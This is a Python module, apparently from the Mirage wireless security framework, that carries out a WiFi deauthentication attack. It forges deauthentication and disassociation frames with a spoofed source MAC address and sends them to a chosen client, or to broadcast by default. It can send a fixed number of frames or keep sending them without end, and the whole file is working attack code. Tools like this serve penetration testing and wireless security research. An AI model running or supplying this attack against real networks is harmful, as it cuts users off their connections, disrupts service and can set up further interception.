from scapy.all import *
from mirage.core import module
from mirage.libs import utils,io,wifi

class wifi_deauth(module.WirelessModule):

	def init(self):
		self.technology = "wifi"
		self.type="attack"
		self.description = "Deauthentication module for WiFi networks"

		self.args = {
				"SOURCE":"00:11:22:33:44:55", # Source's address
				"TARGET":"FF:FF:FF:FF:FF:FF", # Target's address
				"INTERFACE":"wlan0", # Interface (monitor)
				"COUNT":"0", # Packet number (0 = continuously send)
				"MODE":"both", # "disassociation", "deauthentication", "both"
				"VERBOSE":"yes",
				"REASON":"7",
				"CHANNEL":"1"
			}
		self.dynamicArgs = False


	def checkCapabilities(self):
		return self.emitter.hasCapabilities("COMMUNICATING_AS_STATION","COMMUNICATING_AS_ACCESS_POINT","MONITORING")

	# method sending the packets
	def send_deauth(self):
		packet_count = utils.integerArg(self.args["COUNT"])
		if packet_count==0:
			count = 0
			while True:
				if self.args["MODE"].lower() == "both" or self.args["MODE"].lower() == "deauthentication":
					self.emitter.sendp(self.deauth_packet)
				if self.args["MODE"].lower() == "both" or self.args["MODE"].lower() == "disassociation":
					self.emitter.sendp(self.disas_packet)
				utils.wait(seconds=0.05)
				count += 1
				if count % 100 == 0 and utils.booleanArg(self.args['VERBOSE']):
					io.info("Sent {} deauthentication packets via {}".format(count,self.args["INTERFACE"]))
		else:
			for count in range(packet_count):
				if self.args["MODE"].lower() == "both" or self.args["MODE"].lower() == "deauthentication":
					self.emitter.sendp(self.deauth_packet)
				if self.args["MODE"].lower() == "both" or self.args["MODE"].lower() == "disassociation":
					self.emitter.sendp(self.disas_packet)
				utils.wait(seconds=0.05)
				if count % 100 == 0 and utils.booleanArg(self.args['VERBOSE']):
					io.info("Sent {} deauthentication packets via {}".format(count,self.args["INTERFACE"]))

	def run(self):

		self.emitter = self.getEmitter(interface=self.args["INTERFACE"])
		if self.checkCapabilities():
			if not utils.isNumber(self.args["CHANNEL"]):
				io.fail("You must provide a channel number.")
				return self.nok()

			if self.args["TARGET"] == "":
				io.warning("No target provided, the attack is performed in broadcast.")
				self.target = "FF:FF:FF:FF:FF:FF"
			else:
				io.info("Target provided: "+str(self.args["TARGET"]))
				self.target = self.args["TARGET"].upper()

			if self.args["SOURCE"] == "":
				io.fail("You must provide a source address.")
				return self.nok()
			else:
				self.source = self.args["SOURCE"].upper()
			
			if utils.isNumber(self.args["REASON"]):
				self.reason = utils.integerArg(self.args["REASON"])
			else:
				io.fail("You must provide a reason number.")
				return self.nok()
			self.emitter.setChannel(utils.integerArg(self.args["CHANNEL"]))

			# We forge the deauthentication and disassociation packet, while spoofing the client's MAC
			self.deauth_packet = wifi.WifiDeauth(destMac=self.target,srcMac=self.source,reason=self.reason)
			self.disas_packet = wifi.WifiDisas(destMac=self.target,srcMac=self.source,reason=self.reason)

			self.send_deauth()

			return self.ok()

		else:
			io.fail("Interface provided ("+str(self.args["INTERFACE"])+") is not able to run in monitor mode.")
			return self.nok()			
